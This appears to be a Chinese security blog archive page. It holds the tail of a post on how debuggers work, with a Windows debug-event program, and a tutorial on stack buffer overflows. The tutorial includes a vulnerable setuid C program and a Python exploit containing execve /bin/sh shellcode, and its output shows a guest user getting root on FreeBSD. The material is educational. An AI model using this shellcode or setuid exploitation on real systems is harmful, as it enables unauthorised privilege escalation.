class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test2.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"udis86.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"libudis86.lib"</span>)</span></span><br><span class="line"><span class="comment">//disas 函数负责对机器语言进行反汇编，在这里使用了udis86的功能。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">disas</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buff, <span class="keyword">char</span> *out, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">ud_t</span> ud_obj;</span><br><span class="line">    ud_init(&amp;ud_obj);</span><br><span class="line">    ud_set_input_buffer(&amp;ud_obj, buff, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    ud_set_mode(&amp;ud_obj, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    ud_set_syntax(&amp;ud_obj, UD_SYN_INTEL);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ud_disassemble(&amp;ud_obj))&#123;</span><br><span class="line">        sprintf_s(out, size, <span class="string">"%14s %s"</span>,</span><br><span class="line">            ud_insn_hex(&amp;ud_obj), ud_insn_asm(&amp;ud_obj));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)ud_insn_len(&amp;ud_obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//exception_debug_event函数会在发生异常时运行。</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exception_debug_event</span><span class="params">(DEBUG_EVENT *pde)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwReadBytes;</span><br><span class="line"></span><br><span class="line">    HANDLE ph = OpenProcess(</span><br><span class="line">        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_VM_OPERATION,</span><br><span class="line">        FALSE, pde-&gt;dwProcessId);</span><br><span class="line">    <span class="keyword">if</span>(!ph)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    HANDLE th = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,</span><br><span class="line">        FALSE, pde-&gt;dwThreadId);</span><br><span class="line">    <span class="keyword">if</span>(!th)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line">    GetThreadContext(th, &amp;ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> asm_string[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> asm_code[<span class="number">32</span>];</span><br><span class="line"></span><br><span class="line">    ReadProcessMemory(ph, (VOID *)ctx.Eip, asm_code, <span class="number">32</span>, &amp;dwReadBytes);</span><br><span class="line">    <span class="keyword">if</span>(disas(asm_code, asm_string, <span class="keyword">sizeof</span>(asm_string)) == <span class="number">-1</span>)</span><br><span class="line">        asm_string[<span class="number">0</span>] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Exception: %08x (PID:%d, TID:%d)\n"</span>,</span><br><span class="line">        pde-&gt;u.Exception.ExceptionRecord.ExceptionAddress,</span><br><span class="line">        pde-&gt;dwProcessId, pde-&gt;dwThreadId);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">" %08x: %s\n"</span>, ctx.Eip, asm_string);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"    Reg: EAX=%08x ECX=%08x EDX=%08x EBX=%08x\n"</span>,</span><br><span class="line">        ctx.Eax, ctx.Ecx, ctx.Edx, ctx.Ebx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"         ESI=%08x EDI=%08x ESP=%08x EBP=%08x\n"</span>,</span><br><span class="line">        ctx.Esi, ctx.Edi, ctx.Esp, ctx.Ebp);</span><br><span class="line"></span><br><span class="line">    SetThreadContext(th, &amp;ctx);</span><br><span class="line">    CloseHandle(th);</span><br><span class="line">    CloseHandle(ph);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    STARTUPINFO si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"C:\\&gt;%s &lt;sample.exe&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;pi, <span class="number">0</span>, <span class="keyword">sizeof</span>(pi));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;si, <span class="number">0</span>, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(STARTUPINFO);</span><br><span class="line"></span><br><span class="line">    BOOL r = CreateProcess(</span><br><span class="line">        <span class="literal">NULL</span>, argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE,</span><br><span class="line">        NORMAL_PRIORITY_CLASS | CREATE_SUSPENDED | DEBUG_PROCESS,</span><br><span class="line">        <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">    <span class="keyword">if</span>(!r)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    ResumeThread(pi.hThread);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> process_counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">        DEBUG_EVENT de;</span><br><span class="line">        <span class="keyword">if</span>(!WaitForDebugEvent(&amp;de, INFINITE))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        DWORD dwContinueStatus = DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(de.dwDebugEventCode)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> CREATE_PROCESS_DEBUG_EVENT:</span><br><span class="line">            process_counter++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXIT_PROCESS_DEBUG_EVENT:</span><br><span class="line">            process_counter--;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:</span><br><span class="line">            <span class="keyword">if</span>(de.u.Exception.ExceptionRecord.ExceptionCode !=</span><br><span class="line">                EXCEPTION_BREAKPOINT)</span><br><span class="line">            &#123;</span><br><span class="line">                dwContinueStatus = DBG_EXCEPTION_NOT_HANDLED;</span><br><span class="line">            &#125;</span><br><span class="line">            exception_debug_event(&amp;de);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ContinueDebugEvent(</span><br><span class="line">            de.dwProcessId, de.dwThreadId, dwContinueStatus);</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">while</span>(process_counter &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在windows中即使程序不是作为调试器挂载在目标进程上，只要能够获取目标进程的句柄，就可以随意读写该进程的内存空间。（权限/或其它方法）</p>
<p>在exception_debug_event会调用下面的函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//OpenProcess</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320.aspx</span></span><br><span class="line"><span class="function">HANDLE <span class="title">OpenProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwDesiredAccess,           <span class="comment">// 访问标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">    BOOL bInheritHandle,             <span class="comment">// 句柄继承选项</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwProcessId                <span class="comment">// 进程ID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//ReadProcessMemory.获取发生异常时所执行的指令。</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680553.aspx</span></span><br><span class="line"><span class="function">BOOL <span class="title">ReadProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hProcess,             <span class="comment">// 进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPCVOID lpBaseAddress,       <span class="comment">// 读取起始地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpBuffer,             <span class="comment">// 用于存放数据的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nSize,                 <span class="comment">// 要读取的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesRead  <span class="comment">// 实际读取的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//WriteProcessMemory</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms681674.aspx</span></span><br><span class="line"><span class="function">BOOL <span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hProcess,                <span class="comment">// 进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpBaseAddress,           <span class="comment">// 写入起始地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpBuffer,                <span class="comment">// 数据缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD nSize,                    <span class="comment">// 要写入的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPDWORD lpNumberOfBytesWritten  <span class="comment">// 实际写入的字节数</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>用OpenThread打开线程之后，可通过GetThreadContext和SetThreadContext来读写寄存器。以下API的使用可以任意干预其他进程。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//OpenThread 函数</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms684335.aspx</span></span><br><span class="line"><span class="function">HANDLE <span class="title">OpenThread</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwDesiredAccess,<span class="comment">// 访问标志</span></span></span></span><br><span class="line"><span class="function"><span class="params">    BOOL bInheritHandle,  <span class="comment">// 句柄继承选项</span></span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD dwThreadId      <span class="comment">// 线程ID</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//GetThreadContext 函数</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms679362.aspx</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hThread,       <span class="comment">// 拥有上下文的线程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    LPCONTEXT lpContext   <span class="comment">// 接收上下文的结构体地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"><span class="comment">//SetThreadContext</span></span><br><span class="line"><span class="comment">// https://msdn.microsoft.com/en-us/library/windows/desktop/ms680632.aspx</span></span><br><span class="line"><span class="function">BOOL <span class="title">SetThreadContext</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    HANDLE hThread,           <span class="comment">// 拥有上下文的线程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">    CONST CONTEXT *lpContext  <span class="comment">// 存放上下文的结构体地址</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
<p>编译之后，得到test2.exe。准备一个有异常的程序test.exe，作为参数运行test2.exe。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *s=<span class="literal">NULL</span>;</span><br><span class="line">    *s=<span class="number">0xFF</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行<code>C:\&gt;test2.exe test.exe</code>可看到程序中的PID，TID以及异常。</p>
<p><img src="/2018/07/06/调试器原理/2.png" alt="2"></p>
<p>test1/test2文件：<br>链接: <a href="https://pan.baidu.com/s/1cGq06C3YfoXm1rqqYId3KQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1cGq06C3YfoXm1rqqYId3KQ</a> 密码: 57p8</p>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">reverse</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2018/07/06/调试器原理/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-缓冲区溢出及防御" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/06/缓冲区溢出及防御/">缓冲区溢出及防御</a>
    </h1>
  

        
        <a href="/2018/07/06/缓冲区溢出及防御/" class="archive-article-date">
  	<time datetime="2018-07-06T06:27:27.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-07-06</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="1-缓冲区溢出"><a href="#1-缓冲区溢出" class="headerlink" title="1.缓冲区溢出"></a>1.缓冲区溢出</h1><p>缓冲区溢出（buffer overflow）：输入的数据超出了程序规定的内存范围，数据溢出导致程序发生异常。</p>
<p>因为新的大部分Linux系统已更新安全策略，老的缓冲区溢出漏洞不在适用，故在FreeBSD8.3版本中运行，学习一下缓冲区溢出的原理。</p>
<h2 id="1-引发缓冲区溢出的小程序"><a href="#1-引发缓冲区溢出的小程序" class="headerlink" title="1.引发缓冲区溢出的小程序"></a>1.引发缓冲区溢出的小程序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample1.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -Wall sample1.c -o sample1</span><br><span class="line">$ ./sample1 `python -c <span class="string">'print "A"*70'</span>`</span><br><span class="line">Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure>
<p>这个程序为 buff 数组分配了一块 64 字节的内存空间，但传递给程序的参数 argv[1] 是由用户任意输入的，因此参数的长度很有可能会超过 64 字节。strcpy 函数用于复制字符串，一直复制到字符串的边界，即遇到“\0”为止。因此，当用户故意向程序传递一个超过 64 字节的字符串时，就会在 main 函数中引发缓冲区溢出,程序的行为将不可预测，也就存在了一个漏洞。</p>
<h2 id="2-普通用户get-root权限"><a href="#2-普通用户get-root权限" class="headerlink" title="2.普通用户get root权限"></a>2.普通用户get root权限</h2><p>Linux 和 FreeBSD 中有一个用来修改密码的命令“passwd”。密码一般保存在 /etc/master.passwd、/etc/passwd 和 /etc/shadow 等中，没有 root 权限的用户是无法修改这些文件的。当有setuid的机制存在，可让用户使用程序的所有权限来运行程序。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /etc/passwd</span><br><span class="line">-rw-r--r--    1 root root 1020 Nov 8 11:54 /etc/passwd</span><br><span class="line"><span class="comment">#/etc/passwd 文件不允许除 root 以外的用户进行写入，但passwd 命令可以（通过setuid机制）临时以 root 权限来运行</span></span><br><span class="line">$ ls -l /usr/bin/passwd</span><br><span class="line">-r<span class="_">-s</span>--x--x    1 root root 12292 Feb 22 2001 /usr/bin/passwd*</span><br><span class="line"><span class="comment">#s表示已启用setuid</span></span><br></pre></td></tr></table></figure>
<p>调用execve函数运行/bin/sh。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample2.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *data[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">char</span> *exe = <span class="string">"/bin/sh"</span>;</span><br><span class="line"></span><br><span class="line">    data[<span class="number">0</span>] = exe;</span><br><span class="line">    data[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    execve(data[<span class="number">0</span>], data, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//以root权限编译 设置SETUID</span></span><br><span class="line">$ su</span><br><span class="line">Password: 输入root密码</span><br><span class="line"><span class="meta"># gcc -Wall sample2.c -o sample2</span></span><br><span class="line"><span class="meta"># chmod 4755 sample2</span></span><br><span class="line"><span class="meta"># ls -l sample2</span></span><br><span class="line">-rws--x--x  <span class="number">1</span> root  guest  <span class="number">4832</span> Sep  <span class="number">3</span> <span class="number">07</span>:<span class="number">47</span> sample2</span><br><span class="line"><span class="comment">//sample2的权限变为rws，以普通用户运行，root权限调用execve函数，普通用户会以root权限启动/bin/sh。</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ whoami</span><br><span class="line">guest</span><br><span class="line">$ ./sample2</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<h2 id="3-权限夺取"><a href="#3-权限夺取" class="headerlink" title="3.权限夺取"></a>3.权限夺取</h2><p>sample3.c 一个有漏洞的程序，和一个可以攻击夺取权限的exploit.py。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//sample3.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"movl %esp, %eax"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cpy</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buff[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"0x%08lx"</span>, get_sp() + <span class="number">0x10</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="built_in">strcpy</span>(buff, str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cpy(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    addr = <span class="number">0x41414141</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    addr = int(sys.argv[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">s = <span class="string">""</span></span><br><span class="line">s += <span class="string">"\x31\xc0\x50\x89\xe0\x83\xe8\x10"</span> <span class="comment"># 8</span></span><br><span class="line">s += <span class="string">"\x50\x89\xe3\x31\xc0\x50\x68\x2f"</span> <span class="comment">#16</span></span><br><span class="line">s += <span class="string">"\x2f\x73\x68\x68\x2f\x62\x69\x6e"</span> <span class="comment">#24</span></span><br><span class="line">s += <span class="string">"\x89\xe2\x31\xc0\x50\x53\x52\x50"</span> <span class="comment">#32</span></span><br><span class="line">s += <span class="string">"\xb0\x3b\xcd\x80\x90\x90\x90\x90"</span> <span class="comment">#40</span></span><br><span class="line">s += <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> <span class="comment">#48</span></span><br><span class="line">s += <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> <span class="comment">#56</span></span><br><span class="line">s += <span class="string">"\x90\x90\x90\x90\x90\x90\x90\x90"</span> <span class="comment">#64</span></span><br><span class="line">s += <span class="string">"\x90\x90\x90\x90"</span>+pack(<span class="string">'&lt;L'</span>,addr) <span class="comment">#72</span></span><br><span class="line">sys.stdout.write(s)</span><br></pre></td></tr></table></figure>
<p>运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ su</span><br><span class="line">Password:</span><br><span class="line"><span class="comment"># gcc -Wall sample3.c -o sample3</span></span><br><span class="line">sample3.c: In <span class="keyword">function</span> <span class="string">'get_sp'</span>:</span><br><span class="line">sample3.c:9: warning: control reaches end of non-void <span class="keyword">function</span></span><br><span class="line"><span class="comment"># chmod 4755 sample3</span></span><br><span class="line"><span class="comment"># exit</span></span><br><span class="line">$ ./sample3 `python exploit.py`</span><br><span class="line">0xbfbfebe8</span><br><span class="line">Segmentation fault</span><br><span class="line">$ ./sample3 <span class="string">"`python exploit.py bfbfebe8`"</span></span><br><span class="line">0xbfbfebe8</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
<p>sample3.c的cpy函数会将输入的字符串复制到一块只有64字节的内存空间中，由于字符串是由用户任意输入的，将exploit.py的结果给sample3.c，会以root运行/bin/sh。</p>
